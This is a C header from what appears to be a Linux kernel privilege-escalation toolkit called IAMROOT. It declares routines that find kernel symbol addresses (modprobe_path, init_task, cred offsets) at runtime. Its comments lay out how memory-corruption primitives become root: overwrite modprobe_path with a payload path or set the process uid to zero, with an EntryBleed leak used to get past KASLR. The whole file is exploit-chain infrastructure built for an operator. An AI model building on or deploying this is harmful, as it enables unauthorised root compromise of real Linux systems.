/*
 * IAMROOT — kernel offset resolution
 *
 * The 🟡 PRIMITIVE modules each have a trigger that lands a primitive
 * (heap-OOB write, UAF, etc.). Converting that to root requires
 * arbitrary write at a specific kernel virtual address — usually
 * `modprobe_path` (writes a payload path → execve unknown binary →
 * modprobe runs payload as root) or `current->cred->uid` (set to 0).
 *
 * Those addresses vary per kernel build. This file resolves them at
 * runtime via a four-source chain:
 *
 *   1. env vars (IAMROOT_MODPROBE_PATH, IAMROOT_INIT_TASK, ...)
 *   2. /proc/kallsyms (only useful when kptr_restrict=0 or already root)
 *   3. /boot/System.map-$(uname -r) (world-readable on some distros)
 *   4. Embedded table keyed by `uname -r` glob (entries are
 *      relative-to-_text, applied on top of an EntryBleed kbase leak
 *      so KASLR is handled)
 *
 * Per the verified-vs-claimed bar: offsets are never fabricated. If
 * none of the four sources resolve, full-chain refuses with an error
 * pointing the operator at the manual workflow.
 */

#ifndef IAMROOT_OFFSETS_H
#define IAMROOT_OFFSETS_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

enum iamroot_offset_source {
    OFFSETS_NONE         = 0,
    OFFSETS_FROM_ENV     = 1,
    OFFSETS_FROM_KALLSYMS = 2,
    OFFSETS_FROM_SYSMAP  = 3,
    OFFSETS_FROM_TABLE   = 4,
};

struct iamroot_kernel_offsets {
    /* Host fingerprint */
    char kernel_release[128];  /* uname -r */
    char distro[64];           /* parsed from /etc/os-release ID= */

    /* Kernel base — needed when offsets are relative-to-_text.
     * Set by iamroot_offsets_apply_kbase_leak() after EntryBleed runs. */
    uintptr_t kbase;

    /* Symbol virtual addresses (final, post-KASLR-resolution). */
    uintptr_t modprobe_path;   /* modprobe_path[] string */
    uintptr_t poweroff_cmd;    /* poweroff_cmd[] string (alt target) */
    uintptr_t init_task;       /* init_task struct */
    uintptr_t init_cred;       /* init_cred struct (or 0) */

    /* Struct offsets — same across most x86_64 kernels but config-sensitive. */
    uint32_t cred_offset_real; /* offset of real_cred in task_struct */
    uint32_t cred_offset_eff;  /* offset of cred (effective) in task_struct */
    uint32_t cred_uid_offset;  /* offset of uid_t uid in cred (almost always 4) */

    /* Where did each field come from. */
    enum iamroot_offset_source source_modprobe;
    enum iamroot_offset_source source_init_task;
    enum iamroot_offset_source source_cred;
};

/* Best-effort resolution. Returns the number of critical fields
 * resolved (modprobe_path / init_task / cred offsets count). Caller
 * checks specific fields it needs.
 *
 * Resolution chain is tried in order; later sources do NOT overwrite
 * a field already set by an earlier source. */
int iamroot_offsets_resolve(struct iamroot_kernel_offsets *out);

/* Apply a runtime-leaked kbase to any embedded-table entries that
 * shipped as relative-to-_text offsets. Idempotent. */
void iamroot_offsets_apply_kbase_leak(struct iamroot_kernel_offsets *off,
                                      uintptr_t leaked_kbase);

/* Returns true if modprobe_path can be written (the simplest root-pop
 * finisher). */
bool iamroot_offsets_have_modprobe_path(const struct iamroot_kernel_offsets *off);

/* Returns true if init_task + cred offsets are known (the cred-uid
 * finisher). */
bool iamroot_offsets_have_cred(const struct iamroot_kernel_offsets *off);

/* For diagnostic logging — pretty-print what we resolved to stderr. */
void iamroot_offsets_print(const struct iamroot_kernel_offsets *off);

/* Helper: return the name of the source enum. */
const char *iamroot_offset_source_name(enum iamroot_offset_source src);

#endif /* IAMROOT_OFFSETS_H */
